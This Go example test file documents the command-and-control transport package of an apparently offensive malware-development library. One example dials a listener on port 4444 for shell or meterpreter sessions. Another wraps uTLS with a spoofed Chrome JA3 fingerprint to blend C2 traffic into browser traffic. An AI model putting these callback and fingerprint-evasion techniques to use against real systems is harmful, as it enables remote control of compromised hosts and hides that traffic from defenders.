package transport_test

import (
	"context"
	"fmt"
	"time"

	"github.com/oioio-space/maldev/c2/transport"
)

// NewTCP builds a plain-TCP transport. Connect dials when the
// consumer (shell, meterpreter, …) calls Run.
func ExampleNewTCP() {
	t := transport.NewTCP("192.168.56.200:4444", 5*time.Second)
	if err := t.Connect(context.Background()); err != nil {
		fmt.Println("connect:", err)
		return
	}
	defer t.Close()
	_, _ = t.Write([]byte("hello"))
}

// NewUTLS wraps a uTLS handshake with a chosen ClientHelloID
// (Chrome, Firefox, Safari, etc.) for JA3 fingerprinting.
func ExampleNewUTLS() {
	u := transport.NewUTLS("example.com:443", 5*time.Second,
		transport.WithJA3Profile(transport.JA3Chrome),
		transport.WithSNI("example.com"),
	)
	_ = u.Connect(context.Background())
}
